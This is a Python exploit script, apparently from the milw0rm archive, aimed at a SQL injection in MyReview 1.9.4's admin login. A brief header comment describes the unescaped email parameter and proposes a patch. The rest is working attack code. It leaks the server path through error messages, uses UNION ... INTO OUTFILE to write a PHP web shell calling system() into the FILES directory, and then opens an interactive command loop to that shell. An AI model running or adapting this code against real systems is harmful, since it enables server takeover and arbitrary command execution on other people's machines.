# MyReview 1.9.4 SQL Injection exploit
#
#
# http://myreview.lri.fr/
#
# in functions.php starting from line 382
# ............
#	function GetMember ($email, $db, $mode="array")
#	{
#  		$query = "SELECT * FROM PCMember WHERE email = '$email'" ;
#		result = $db->execRequete ($query);
# ..........
#
# $email is not checked before used into $query
#
# for patch
#
# 1. add "$email=addslashes(trim($email));" before $query
# 2. use something else, very buggy script
#
# by STILPU (dmooray[a lu']gmail.com)
#


import httplib, urllib, re, urlparse, sys

def usage():
	print """
MyReview 1.9.4 SQL Injection exploit

Usage: python exploit.py http://target/pathtomyreview/

Requires warnings to be displayed so we cat get the localpath and FILES/ to be writable

by STILPU  (dmooray[a lu']gmail.com)

"""
	sys.exit(1)

def getlocalpath(server):
	params=urllib.urlencode({'email':'\'','motDePasse':'a','ident':'Log in'})
	headers={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	con = httplib.HTTPConnection(server)
	con.request("POST",path+"Admin.php",params,headers)
	resp=con.getresponse()
	data=resp.read()
	try:
		localpath=re.search('>/.*B',data[0:10000]).group().replace('>','',1).replace('B','',1)
	except Exception: print "Exploit failed: didn`t manage to get localpath"; sys.exit(1)
	return localpath

def sendshell(server):
	shell="'<?php error_reporting(0); ini_set(\"max_execution_time\",0); system($_GET[cmd]); /*'"
	sql="' union select " + shell + ",0,0,0,'*/ ?>' into outfile '" +getlocalpath(server)+ "FILES/STILPU.php' from PCMember#"
	headers={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	params=urllib.urlencode({'email':sql,'motDePasse':'a','ident':'Log in'})
	con = httplib.HTTPConnection(server)
	con.request("POST",path+"Admin.php",params,headers)

def sendcmd(server):
	while 1:
		try:
			cmd=raw_input('sh$ ')
			cmd=cmd.replace(" ","+")
			con = httplib.HTTPConnection(target)
			con.request("GET",path+"FILES/STILPU.php?cmd="+cmd)
			resp=con.getresponse()
			data=resp.read()
			if (cmd=="exit" or cmd=="quit"): break
			print data
		except KeyboardInterrupt: break


if __name__ == '__main__':

	if len(sys.argv) < 2:
		usage()

	else:
		url = sys.argv[1]
		url = urlparse.urlsplit(url)
		target = url[1]
		path = url[2]

		sendshell(target)
		sendcmd(target)

# milw0rm.com [2006-09-19]